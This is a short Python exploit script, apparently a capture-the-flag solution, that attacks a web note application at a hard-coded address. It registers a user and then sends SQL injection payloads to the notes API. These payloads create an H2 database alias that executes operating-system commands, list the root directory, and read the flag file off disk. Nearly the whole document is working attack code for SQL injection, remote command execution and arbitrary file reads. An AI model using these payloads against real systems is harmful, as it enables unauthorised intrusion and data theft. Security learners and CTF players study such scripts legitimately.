import requests,re, traceback

base_url = "http://94.237.62.166:57207"

def send_payload(session, url, payload):
    data = {
        "name": (None, payload)
    }
    response = session.post(url, files=data, verify=False, timeout=2)
    return response

def main_attack():
    user = {
        "username": "test_user",
        "password": "securepassword123"
    }
    session = requests.Session()
    
    session.post(f"{base_url}/register", data=user)
    session.post(f"{base_url}/login", data=user)
    
    payload1 = "1'; CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";  }'; --"
    payload2 = "1' UNION SELECT 10, EXECVE('ls /'), NULL -- "

    response = send_payload(session, f"{base_url}/api/note", payload1)
    response = send_payload(session, f"{base_url}/api/note", payload2).json()[0]['Name']

    flag_name = get_flag_name(response)

    payload3 = f"1' UNION SELECT null, null, cast(file_read('/{flag_name}', null) as varchar) -- "
    flag = send_payload(session, f"{base_url}/api/note", payload3).json()[0]['Note']

    print(f"Congratulations, here's your flag {flag}")


def get_flag_name(response):
    flag_name = re.search(r"\S*flag\.txt", response).group()

    return flag_name
    

if __name__ == '__main__':
    try:
        main_attack()
    except:
        print('Something went wrong.\n\n')
        traceback.print_exc()
